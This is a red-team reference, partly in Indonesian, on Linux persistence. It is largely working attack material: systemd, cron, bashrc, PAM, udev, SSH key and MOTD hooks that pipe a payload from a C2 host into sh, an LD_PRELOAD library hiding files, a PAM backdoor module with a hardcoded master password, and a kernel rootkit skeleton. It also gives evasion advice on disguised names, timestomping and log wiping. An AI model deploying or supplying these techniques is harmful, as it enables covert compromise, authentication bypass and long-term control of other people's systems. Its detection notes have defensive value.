# persistence-linux — linux

# Linux Persistence — Red Team Reference

## 1. systemd Unit (service/timer)

**Artifacts:** `.service` + `.timer` in `/etc/systemd/system/`, `~/.config/systemd/user/`, or drop-in `/etc/systemd/system/<unit>.d/override.conf`.

**System-level service (root):**
```ini
# /etc/systemd/system/systemd-udevd-helper.service
[Unit]
Description=udev helper
After=network.target

[Service]
Type=simple
ExecStart=/usr/local/bin/.cache/.udevd --daemon
Restart=always
RestartSec=30

[Install]
WantedBy=multi-user.target
```
```bash
systemctl daemon-reload
systemctl enable --now systemd-udevd-helper.service
```

**User-level timer (no root, requires lingering):**
```ini
# ~/.config/systemd/user/.cache-sync.timer
[Unit]
Description=Cache sync
[Timer]
OnBootSec=2min
OnUnitActiveSec=6h
Persistent=true
[Install]
WantedBy=timers.target
```
```ini
# ~/.config/systemd/user/.cache-sync.service
[Service]
ExecStart=/bin/sh -c 'curl -fsSL https://<c2>/s|sh'
```
```bash
systemctl --user daemon-reload
systemctl --user enable --now .cache-sync.timer
loginctl enable-linger $USER   # agar user unit jalan tanpa login
```

**Drop-in override (high stealth — modify existing unit without new files):**
```bash
mkdir -p /etc/systemd/system/ssh.service.d
cat >/etc/systemd/system/ssh.service.d/10-helper.conf <<'EOF'
[Service]
ExecStartPre=/usr/local/lib/.sshd-helper
EOF
systemctl daemon-reload
```

**What appears:**
- `systemctl list-timers --all` → timer kita.
- `journalctl -u <unit>` → jejak ExecStart.
- `systemd-analyze verify` → warning jika unit salah.

**Why it works:** systemd runs any `ExecStart` as root without automatic SELinux label adjustment; `Restart=always` makes the process survive kill.

**Why it fails:** on systemd ≥ 250 with `DefaultDependencies=no` misused → unit does not start. Distros with read-only `/etc` (rpm-ostree/Fedora Silverblue/CoreOS) → writing to `/etc/systemd/system` fails; use `/etc/systemd/system` via `rpm-ostree` override or user unit.

**Stealth notes:**
- Nama unit meniru paket existing: `polkit-helper.service`, `dbus-monitor.service`, `NetworkManager-wait-online-helper.service`.
- Place the binary in `/usr/local/lib/`, `/lib/systemd/.cache/`, or a path rarely hit by `find / -mtime`.
- `StandardOutput=null`, `StandardError=null` → sembunyikan log.
- Avoid `[Install]` in drop-in (drop-in does not need enable).
- Cek deteksi: `systemctl show -p FragmentPath,ExecStart <unit>`.

---

## 2. cron & at

### cron

**Artefak:**
| Lokasi | Pemilik | Format |
|---|---|---|
| `/etc/crontab` | root | has user column |
| `/etc/cron.d/<name>` | root | has user column |
| `/etc/cron.{hourly,daily,weekly,monthly}/` | root | script executable |
| `/var/spool/cron/crontabs/<user>` (Debian) / `/var/spool/cron/<user>` (RHEL) | user | no user column |
| `~/.crontab` via `crontab -e` | user | no user column |

```bash
# root, /etc/cron.d — paling tidak mencolok (nama file = nama paket)
cat >/etc/cron.d/apt-daily-health <<'EOF'
SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
17 3 * * * root /usr/lib/apt/.apt-helper --quiet 2>/dev/null
EOF

# user (butuh cron aktif untuk user tsb)
(crontab -l 2>/dev/null; echo '*/15 * * * * /bin/sh -c "curl -fsSL https://<c2>/s|sh" >/dev/null 2>&1') | crontab -
```

**What appears:** user `crontab -l`, `ls -la /var/spool/cron/`, syslog `CRON[pid]: (user) CMD (...)` on every execution.

**Stealth:**
- Cron daemon logs every execution to syslog/auth.log — mitigation: `>/dev/null 2>&1` only hides output, **not** the CRON log. To be truly silent, use `@reboot` (one-time) or `MAILTO=""`.
- `cron.d` file requires trailing newline and permission `0644 root:root`; `0666` or wrong owner → cron silently ignores.
- Debian: `cron` only reads `/var/spool/cron/crontabs` if directory is `1730` and file is `0600`; otherwise, entry does not run.
- `crontab -e` rewrites the entire file → risk of deleting original entries if parsing is wrong.
- RHEL 8+/Debian 11+: `cron.deny`/`cron.allow` membatasi user non-root.

### at

```bash
echo '/usr/local/lib/.x' | at now + 5 minutes
atq; at -c <jobid>    # verifikasi
```
**Artefak:** `/var/spool/cron/atjobs/<jobid>` (owner user, mode 0700), `/var/spool/cron/atspool/`.
**What appears:** `atq`, syslog `atd[pid]: (user) ...`.

**Stealth / jebakan:**
- `atd` must be running; minimal containers do not have `atd`.
- User jobs disappear if the user does not exist; root jobs write with a timestamp name that is easy to find with `find /var/spool/cron -newer`.
- `at` does not survive reboot if `atd` is not executed at boot.

---

## 3. `.bashrc` / `.profile` / shell startup

**Artefak:**

| File | Shell | Kapan |
|---|---|---|
| `/etc/profile` | all (login) | login shell |
| `/etc/bash.bashrc` (Debian) / `/etc/bashrc` (RHEL) | bash interaktif | tiap shell |
| `~/.bashrc` | bash interaktif | tiap terminal |
| `~/.bash_profile` / `~/.profile` / `~/.bash_login` | bash/sh login | SSH login |
| `~/.zshrc`, `/etc/zsh/zshrc`, `/etc/zshrc` | zsh | |
| `~/.config/fish/config.fish` | fish | |
| `~/.ssh/rc` | sshd | tiap SSH sukses (server-side, `<user>`) |

**Payload stager — silent background:**
```bash
# ~/.bashrc
if [ -z "$_S" ] && [ -x /usr/bin/curl ]; then
  export _S=1
  setsid /bin/sh -c 'curl -fsSL https://<c2>/s 2>/dev/null | sh' </dev/null >/dev/null 2>&1 &
fi
```
- `setsid` → detach from shell session, avoid SIGHUP.
- Guard env `_S` → cegah recurse & cepat hilang.
- `< /dev/null` + redirect → does not block terminal.

**`/etc/profile.d/` (ored, all login users):**
```bash
cat >/etc/profile.d/.bz2.sh <<'EOF'
[ -r /usr/local/lib/.helper ] && (. /usr/local/lib/.helper </dev/null >/dev/null 2>&1 &)
EOF
```

**What appears:** `grep -r "curl\|wget\|base64" ~/.bashrc` — mitigation: use base64, alias, or call the binary directly. Interactive `bash -x` will display the line.

**Why it fails:**
- Non-interactive shell (scp, non-login `ssh user@host cmd`) does **not** read `.bashrc` — only reads `BASH_ENV` or `/etc/bash.bashrc`? No: `/etc/bash.bashrc` is only for interactive on Debian (guard `[ -z "$PS1" ] && return`). For non-login SSH, use `~/.ssh/rc` or PAM.
- `bash --norc` / `--noprofile` / `env -i`.
- Systems with `readonly` or osquery FIM on dotfiles.

**`~/.ssh/rc`** (server must also have `PermitUserRC yes`, default yes):
```bash
#!/bin/sh
if [ -r /tmp/.k ]; then . /tmp/.k </dev/null >/dev/null 2>&1 & fi
```
Triggers on every successful SSH — even `ssh host id` (non-login, without shell rc).

---

## 4. LD_PRELOAD & `/etc/ld.so.preload`

### `/etc/ld.so.preload` (root, most powerful)
```bash
echo /usr/local/lib/libnss_cache.so.2 > /etc/ld.so.preload
```
- `ld.so.preload` is read by **every** dynamic-linked binary, including `sshd`, `ps`, `ls`. If the library there errors/crashes, the system is **broken**.
- Library must be `strip`ped, without obvious exported symbols.

**Example `readdir` hook to hide files:**
```c
#define _GNU_SOURCE
#include <dlfcn.h>
#include <dirent.h>
#include <string.h>

static int (*orig_readdir)(DIR*) = NULL;
struct dirent* readdir(DIR *d){
    if(!orig_readdir) orig_readdir = dlsym(RTLD_NEXT,"readdir");
    struct dirent *e;
    while((e = orig_readdir(d))){
        if(strstr(e->d_name,".helper")) continue;      // sembunyikan
        if(strstr(e->d_name,"libnss_cache")) continue;
        return e;
    }
    return NULL;
}
```
```bash
gcc -shared -fPIC -O2 -s -o /usr/local/lib/libnss_cache.so.2 hide.c -ldl
chmod 0755 /usr/local/lib/libnss_cache.so.2
```

**What appears:** static `ld.so.preload` file contents — trivial detection via `cat /etc/ld.so.preload`, `rpm -V glibc`, `auditctl -w /etc/ld.so.preload`.
**Why it fails:** SELinux `deny` exec on unconfined-labeled library when `sshd_t` loads; AppArmor; musl (Alpine) does not read `ld.so.preload`; statically-linked binary (`busybox-static`) skips.

**Stealth:** library must be **thread-safe** and handle recursive calls (many static programs). Hiding `ld.so.preload` from the `readdir` hook itself is impossible (chicken-and-egg) → just hide other file names.

### `LD_PRELOAD` per-user / per-service
```bash
# systemd
systemctl set-environment LD_PRELOAD=/usr/local/lib/x.so   # global ke unit
# atau unit override [Service] Environment=LD_PRELOAD=...
```
- Does not work for `sshd` (built with `secure_getenv`/setuid → ignores LD_*).
- Does not work for setuid-root binaries.
- Works for normal user processes (browser, shell).

**Pitfall:** `LD_PRELOAD` is lost with `sudo` (env_reset); must use `sudo -E` or `/etc/sudoers` `env_keep += LD_PRELOAD` (clear trace).

---

## 5. PAM module

**Goal:** code execution on login/su/sshd/sudo, or authentication backdoor.

**Injeksi sistem-wide:**
```
# /etc/pam.d/common-auth (Debian) / system-auth (RHEL)
auth  optional  pam_exec.so quiet /usr/local/lib/.pam_auth.sh
```
`pam_exec` runs a script with PAM env (`PAM_USER`, `PAM_RHOST`, `PAM_TYPE`). Exit code `optional` → ignored.

**Payload `pam_exec` (stager):**
```bash
#!/bin/sh
[ "$PAM_TYPE" = "open_session" ] || exit 0
[ -f /tmp/.pam.lock ] && exit 0
: > /tmp/.pam.lock
( /bin/sh -c 'curl -fsSL https://<c2>/s|sh' </dev/null >/dev/null 2>&1 & ) &
exit 0
```

**Backdoor auth — modul custom:**
```c
#include <security/pam_modules.h>
#include <string.h>
PAM_EXTERN int pam_sm_authenticate(pam_handle_t *p, int f, int c, const char **v){
    const char *pw = NULL; pam_get_authtok(p, PAM_AUTHTOK, &pw, NULL);
    if(pw && strcmp(pw, "S3cr3t!Bkdr")==0) return PAM_SUCCESS;
    return PAM_IGNORE;   // jatuh ke modul berikutnya (asli)
}
```
Build:
```bash
gcc -shared -fPIC -o /lib/security/pam_unixbk.so.2 pam.c -lpam
```
Register **before** `pam_unix` in `common-auth`:
```
auth  [success=done default=ignore]  pam_unixbk.so.2
```
- Success → `done`, skip `pam_unix` → any password rejected, **except** `S3cr3t!Bkdr` can log in as any user.

**What appears:** `pam-auth-update`, diff `/etc/pam.d/*`, `journalctl -t sudo` with `PAM` error.
**Why it fails:** wrong module SONAME (`pam_*.so` must be recognized by `pam-auth-update`), wrong path (`/lib/security` vs `/lib64/security` vs `/usr/lib/x86_64-linux-gnu/security`), wrong PAM signature, SELinux (`pam_t` domain, requires `lib_t`/`textrel_shlib_t` label), `sshd` with `UsePAM no`.

**Fatal pitfall:** if the custom module **crashes** during login, the system can be **completely locked out** — always test in a VM, prepare console/recovery access, and do not touch `other` in `common-auth` before the module is tested with a trivial `pam_exec`.

---

## 6. udev rule

**Artifact:** `/etc/udev/rules.d/99-<name>.rules` (larger number = lower priority, but ordering between files is numeric).

**Payload — triggred oleh hotplug USB/net:**
```
# /etc/udev/rules.d/90-net-helper.rules
ACTION=="add", SUBSYSTEM=="net", RUN+="/bin/sh -c '/usr/local/lib/.net-hook %k </dev/null >/dev/null 2>&1 &'"
```
Or trigger disk:
```
ACTION=="add", KERNEL=="sd*", RUN+="/usr/local/lib/.disk-hook %k"
```

**Reload without reboot:**
```bash
udevadm control --reload-rules
udevadm trigger --subsystem-match=net   # atau --action=add
```

**Why it works:** `RUN+=` runs as **root** at early boot and on every hotplug. Suitable for containers/conditions that must not be restarted.

**Why it fails / pitfalls:**
- `RUN` must not run a foreground daemon — udev **blocks** the event until the process exits (timeout ~180s), so `&`, `setsid`, or `systemd-run` is required.
- `RUN` does **not** run inside containers (no udev) or on systems where `udev` is replaced with `systemd-udevd` in low `--children-max` mode.
- The rule must be a single logical line; `\` line-continuation is **not supported**.
- `PROGRAM=` vs `RUN=`: `PROGRAM=` for checks only, `RUN` for actions.
- `udevadm test /sys/class/net/eth0` for debugging; `journalctl -u systemd-udevd`.
- File misnamed (`*.rule` instead of `*.rules`?) — extension must be `.rules`.

---

## 7. SSH `authorized_keys` & `ForceCommand`

### authorized_keys
```bash
mkdir -p ~/.ssh && chmod 700 ~/.ssh
cat >> ~/.ssh/authorized_keys <<'EOF'
ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAI... attacker@c2
EOF
chmod 600 ~/.ssh/authorized_keys
```

**With `command=` (force payload, key only for stager):**
```
command="curl -fsSL https://<c2>/s | sh",no-port-forwarding,no-agent-forwarding,no-pty ssh-ed25519 AAAA...
```
- Every connect runs the payload, does not open a shell.

**What shows up:**
- `sshd` log: `Accepted publickey for user from x.x.x.x port ... ssh2: ED25519 SHA256:...`
- Fingerprint **differs** from the legitimate key — detect via baseline `journalctl -u ssh`.
- `/root/.ssh/authorized_keys` (root login) or a user with `sudo`.

**Jebakan:**
- `PermitRootLogin prohibit-password` (Debian/Ubuntu default) → root key OK, root password not.
- `AuthorizedKeysFile .ssh/authorized_keys` can be overridden; check `sshd -T | grep authorizedkeys`.
- `StrictModes yes` (default) → **owner group/world-writable** → `sshd` ignores it. `chmod 600` and home `0755` (not group-writable).
- SELinux `ssh_home_t` on `.ssh` → `restorecon -R ~/.ssh`.
- `from="10.0.0.0/8"` restricts source — do not use if C2 is external.

### `ForceCommand` (server-side, `/etc/ssh/sshd_config`)
```
Match User deploy
    ForceCommand /usr/local/lib/.deploy-shell
    PermitTTY no
```
Or a global `ForceCommand` — all users directed to the wrapper:
```bash
#!/bin/sh
# wrapper: log + teruskan ke shell asli
logger -t sshd-fc "ForceCommand user=$USER from=$SSH_CLIENT cmd=$SSH_ORIGINAL_COMMAND"
exec /bin/bash -l
```

**Pitfall:** `ForceCommand` **blocks** SFTP/scp (unless `internal-sftp` is specially handled via `Subsystem sftp internal-sftp` + Match). Forgetting `PermitTTY no` → the user can still open an interactive shell via the wrapper.

---

## 8. MOTD

**Artefak:**
- Debian/Ubuntu: `/etc/update-motd.d/` (executable scripts, run by `pam_motd` as **root** via `pam_exec` at login).
- RHEL: `/etc/motd.d/`, `/etc/motd`, `pam_motd` reads static files (no execution).
- `/etc/issue` (before login, `agetty`).

**Payload Debian (root, tiap SSH login):**
```bash
cat >/etc/update-motd.d/99-cache-refresh <<'EOF'
#!/bin/sh
[ -f /tmp/.motd.lock ] && exit 0
: > /tmp/.motd.lock
( curl -fsSL https://<c2>/s 2>/dev/null | sh ) </dev/null >/dev/null 2>&1 &
exit 0
EOF
chmod 0755 /etc/update-motd.d/99-cache-refresh
```

**Why it works:** on Debian/Ubuntu, `pam_motd` executes `run-parts /etc/update-motd.d` as root in the **open_session** session — equivalent to `pam_exec`.

**Why it fails:**
- RHEL/CentOS/Fedora: `/etc/update-motd.d` is not executed (there is no `pam_motd` script execution; `motd` is file-only). Do not use on RHEL.
- Docker/container: `pam_motd` biasanya dimatikan.
- `PrintMotd no` in `sshd_config` does not affect `pam_motd`.
- Triggers only on interactive login; does `ssh host id` not trigger `open_session` `pam_motd`? **Yes, it triggers** — `pam_motd` runs in `session open_session`, not TTY-dependent.
- `journalctl -u ssh` logs the session; the script itself does not log (unless `set -x` is present).

**`/etc/issue`** is only displayed by `agetty` to the local console (tty1-6), **not** SSH. Useless for remote persistence.

**Stealth:** filename `99-<package name>` mimics a package; do not `chmod +x` before testing; use `exit 0` so `run-parts` does not fail.

---

## 9. Kernel module

**Artifact:** `.ko` in `/lib/modules/$(uname -r)/extra/`, `depmod` entry, `/etc/modules-load.d/` for auto-load, or `modprobe.d` + `install` directive.

**Auto-load saat boot:**
```bash
mkdir -p /lib/modules/$(uname -r)/extra
cp rootkit.ko /lib/modules/$(uname -r)/extra/.cache.ko   # nama menipu
depmod -a
echo ".cache" >/etc/modules-load.d/cache.conf             # nama file tanpa .ko
```

**Manual (without reboot):**
```bash
insmod /lib/modules/$(uname -r)/extra/.cache.ko
```

**modprobe.d inject (jalankan helper tiap load modul lain):**
```
# /etc/modprobe.d/.options.conf
install usb-storage /sbin/modprobe --ignore-install usb-storage && /usr/local/lib/.usb-hook
```

**Minimal rootkit — `readdir`/`getdents64`, `kill` for backdoor, hide PID:**
```c
// skeleton kallsyms hook
static struct list_head *mod_list;
static int __init rk_init(void){
    mod_list = THIS_MODULE->list.prev;
    list_del(&THIS_MODULE->list);
    return 0;
}
```
Hooking `sys_call_table` on kernel ≥ 5.7 requires bypassing CR0/WP + FTrace; kernel lockdown (`CONFIG_LOCK_DOWN_KERNEL_FORCE_INTEGRITY=y`) on Ubuntu 20.04+/RHEL 8.4+ **blocks** the `kallsyms_lookup_name` export → requires a kprobe trick (`register_kprobe` + `kallsyms_lookup_name` via symbol address).

**Concrete versions & why they fail:**
- **Kernel 5.7+**: `kallsyms_lookup_name` is not exported. Classic rootkits fail to compile/load. Requires `kprobe` or `__ksymtab` scanning.
- **Kernel 5.4 LTS (Ubuntu 20.04)**: still exported → old rootkits work.
- **Kernel 6.6+ (RHEL 9.4+, Ubuntu 24.04)**: `CONFIG_MODULE_SIG_FORCE=y` on RHEL 9 → unsigned modules are **rejected** (`insmod: ERROR: could not insert module: Key was rejected by service`). Bypass: disable `secureboot`, or `mokutil --disable-validation` (obvious traces).
- **SELinux enforcing** (`kernel_t`/`modules_t`) memblok `init_module`; `auditctl` melihat `sys_module` denied.
- **Container**: `/lib/modules` is empty, `cap_sys_module` is absent in default Docker.

**What shows up:**
```bash
lsmod                          # hilang jika list_del sudah dilakukan
cat /proc/modules              # idem
dmesg | grep -i "taint"        # tainted kernel (O)
rpm -V kernel / dkms status
kat /sys/module/<name>
```

**Forensic detection:** `LKMs` hash baseline, `cat /sys/kernel/tainted`, `bpftrace`, `volatility`. A missing `lsmod` entry does **not** mean safe — `/sys/module/.cache` still exists, `/proc/kallsyms` still has the symbols.

**Stealth:** do not use an obvious name (`rootkit`), do not `pr_info` in `init` (shows in `dmesg`), remove from `THIS_MODULE->list` to hide from `lsmod`.

**Pitfall:** `dmesg` still records `loading out-of-tree module taints kernel` unless `MODULE_LICENSE("GPL")`, and the `O` taint remains in `/sys/kernel/tainted`. On RHEL secure boot → the module cannot be loaded without signing/MOK, and `mokutil --import` requires console interaction at reboot.

---

## Operational Pitfalls (the most common field failures)

| # | Jebakan | Gejala | Mitigasi |
|---|---|---|---|
| 1 | **systemd user unit without linger** | User timer disappears after logout | `loginctl enable-linger <user>`; check `loginctl show-user <u> -p Linger` |
| 2 | **systemd drop-in without `daemon-reload`** | `ExecStartPre` does not run | `systemctl daemon-reload` after writing; check `systemctl cat <unit>` |
| 3 | **`/etc` read-only** (Silverblue, CoreOS, container Distroless) | File write fails `EROFS` | Check `findmnt /etc`; fallback to user unit / `/var`, or tmpfs persistence |
| 4 | **`cron.d` wrong permission / owner** | File exists, entry doesn't run | Must be `0644 root:root`, trailing newline, name without dots (cron ignores files with `.`) |
| 5 | **cron `MAILTO` default** sends output to `/var/mail` | Email log contains payload path | Set `MAILTO=""` on the first line of the cron.d file |
| 6 | **`.bashrc` not read** for `ssh host cmd` / scp / rsync (non-login) | "Already installed but doesn't trigger" | Use `~/.ssh/rc` (requires `PermitUserRC yes`) or PAM/ForceCommand |
| 7 | **`/etc/ld.so.preload` broken library** | **All binaries segfault**, system can't log in | Build with `-static-libgcc`, test in VM, prepare console/single-user |
| 8 | **LD_PRELOAD ignored by setuid binaries** | `sshd`, `sudo`, `passwd` not affected | Use `ld.so.preload` or PAM for setuid targets |
| 9 | **PAM module crash** | All logins fail, including console | Test module with `pamtester` before registering; prepare recovery boot |
| 10 | **PAM path salah distro** | `pam_unixbk.so.2: cannot open shared object file` | Cek `/usr/lib/x86_64-linux-gnu/security`, `/lib64/security`, `/usr/lib/security` |
| 11 | **udev `RUN` blocking** | Hotplug hangs, boot slow 180s+ | Must use `&`, `setsid`, or `systemd-run --no-block` |
| 12 | **udev rule `\` multiline** | Rule doesn't parse | One line per rule; no line-continuation |
| 13 | **authorized_keys wrong mode/owner** (`StrictModes`) | `sshd` silently ignores key | `.ssh 700`, `authorized_keys 600`, home not group-writable, SELinux `ssh_home_t` |
| 14 | **`PermitRootLogin prohibit-password`** | Root key OK, but `password` is tried → fails | Use key; check `sshd -T \| grep -i permitrootlogin` |
| 15 | **`ForceCommand` breaks SFTP** | `subsystem request failed` | Keep `Subsystem sftp internal-sftp` or a dedicated Match |
| 16 | **MOTD on RHEL/Fedora** | Script not executed | RHEL `pam_motd` only `cat`s files; use cron/systemd on RHEL |
| 17 | **Kernel module signature enforcement** (RHEL 9, Ubuntu 22.04+ with Secure Boot) | `Key was rejected by service` | Requires MOK/signing; or disable Secure Boot (via physical interaction) |
| 18 | **`kallsyms_lookup_name` not exported by kernel ≥5.7** | Rootkit doesn't compile | Use kprobe trick or `__ksymtab` walk |
| 19 | **SELinux enforcing** blocks `init_module`, `.ssh` write, `pam_exec` path | `avc: denied` in `audit.log` | `ausearch -m avc`; change label (`chcon -t ssh_home_t`, `bin_t`) or disable (large footprint) |
| 20 | **AppArmor Ubuntu** blocks `pam_exec` in `sshd` profile | Login without payload execution | Check `aa-status`; `/etc/apparmor.d/local/usr.sbin.sshd` |
| 21 | **Container without full systemd/cron/udev/PAM** | All techniques above fail | Container persistence: image layer (rebuild image), volume mount, `docker exec` entrypoint, or Kubernetes `DaemonSet`/`postStart` hook |
| 22 | **`/tmp` noexec** | Payload in `/tmp` fails to exec | Check `mount \| grep noexec`; use `/dev/shm` (often exec) or `/var/tmp` |
| 23 | **AppArmor/SELinux restricts `curl` to C2** during `pam_exec` | Payload download fails silently | Pre-stage binary on disk, avoid network at trigger time |
| 24 | **`atd`/`cron`/`sshd` inactive** | All triggers dead | Check `systemctl is-active`, `ss -lntp` (sshd), fallback to a suitable technique |
| 25 | **Timestamp `/etc/ld.so.preload` changes** | `find / -newer /etc/hostname` detects | `touch -r /etc/hostname /etc/ld.so.preload` after writing |
| 26 | **Unit/rule/binary name not domain-consistent** | Easy IOC (`.cache`, `helper`, `_bk`) | Disguise with package names; avoid root dotfiles (`.` in `/etc` is suspicious) |
| 27 | **Cloud credentials (IMDS) used by payload** | Requires proxy/firewall — often blocked | Test C2 reachability from host; prepare DNS/DoH fallback |
| 28 | **`journalctl` monitoring** | All `systemctl`, `cron`, `sshd` recorded | Clean `journalctl --rotate --vacuum-time=1s` — but this is an obvious **IOC**; better not to trigger logs (avoid `systemctl restart`, use daemon-reload only if needed) |

---

## [reasoning trace]


